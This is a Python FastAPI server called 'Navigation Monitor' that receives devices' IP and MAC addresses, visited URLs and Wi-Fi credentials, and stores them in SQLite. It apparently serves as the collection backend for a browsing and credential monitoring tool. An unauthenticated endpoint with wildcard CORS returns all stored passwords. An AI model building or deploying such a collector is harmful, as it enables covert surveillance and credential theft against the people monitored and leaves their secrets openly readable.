import json
import sqlite3
from datetime import datetime
from typing import List

from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel


DB_NAME = "navigation.db"

app = FastAPI(title="Navigation Monitor")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)


class NavigationEntry(BaseModel):
    ip_address: str
    mac_address: str
    network_name: str | None = None
    url: str
    timestamp: str | None = None
    wifi_credentials: list[dict] | None = None


def init_db() -> None:
    connection = sqlite3.connect(DB_NAME)
    connection.execute(
        """
        CREATE TABLE IF NOT EXISTS navigation (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address TEXT NOT NULL,
            mac_address TEXT NOT NULL,
            network_name TEXT,
            url TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            wifi_credentials TEXT
        )
        """
    )
    connection.commit()
    connection.close()


@app.on_event("startup")
def startup_event() -> None:
    init_db()


@app.post("/send")
def save_navigation(entry: NavigationEntry):
    if not entry.url or not entry.ip_address or not entry.mac_address:
        raise HTTPException(status_code=400, detail="Données invalides")

    timestamp = entry.timestamp or datetime.now().isoformat()
    wifi_credentials = entry.wifi_credentials or []

    connection = sqlite3.connect(DB_NAME)
    connection.execute(
        "INSERT INTO navigation (ip_address, mac_address, network_name, url, timestamp, wifi_credentials) VALUES (?, ?, ?, ?, ?, ?)",
        (
            entry.ip_address,
            entry.mac_address,
            entry.network_name or "Inconnu",
            entry.url,
            timestamp,
            json.dumps(wifi_credentials, ensure_ascii=False),
        ),
    )
    connection.commit()
    connection.close()

    return {"status": "ok", "message": "URL enregistrée"}


@app.get("/navigation-data")
def get_navigation_data() -> List[dict]:
    connection = sqlite3.connect(DB_NAME)
    connection.row_factory = sqlite3.Row
    rows = connection.execute(
        "SELECT ip_address, mac_address, network_name, url, timestamp, wifi_credentials FROM navigation ORDER BY id DESC"
    ).fetchall()
    connection.close()

    result = []
    for row in rows:
        item = dict(row)
        raw_wifi = item.get("wifi_credentials")
        try:
            item["wifi_credentials"] = json.loads(raw_wifi) if raw_wifi else []
        except (TypeError, ValueError):
            item["wifi_credentials"] = []
        result.append(item)

    return result


if __name__ == "__main__":
    import uvicorn

    uvicorn.run("server:app", host="0.0.0.0", port=8001, reload=True)
